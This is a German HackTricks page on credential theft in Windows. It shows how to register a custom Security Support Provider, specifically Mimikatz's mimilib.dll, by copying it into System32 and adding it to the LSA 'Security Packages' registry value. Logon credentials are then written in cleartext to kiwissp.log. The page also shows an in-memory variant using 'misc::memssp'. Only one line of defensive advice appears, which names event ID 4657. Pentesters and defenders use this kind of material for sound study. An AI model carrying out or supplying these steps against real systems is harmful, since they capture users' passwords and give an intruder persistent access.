# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Erfahre hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die für den Zugriff auf die Maschine verwendeten **Credentials** im **Klartext** zu **erfassen**.

#### Mimilib

Du kannst die von Mimikatz bereitgestellte Binärdatei `mimilib.dll` verwenden. **Damit werden alle Credentials im Klartext in einer Datei protokolliert.**\
Lege die DLL in `C:\Windows\System32\` ab.\
Rufe eine Liste der vorhandenen LSA Security Packages ab:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Füge `mimilib.dll` zur Liste der Security Support Provider (Security Packages) hinzu:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Und nach einem Neustart können alle Zugangsdaten im Klartext in `C:\Windows\System32\kiwissp.log` gefunden werden.

#### Im Speicher

Du kannst dies auch direkt mithilfe von Mimikatz in den Speicher injizieren (beachte, dass dies möglicherweise etwas instabil ist bzw. nicht funktioniert):
```bash
privilege::debug
misc::memssp
```
Dies übersteht Neustarts nicht.

#### Gegenmaßnahme

Event ID 4657 – Überwachung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
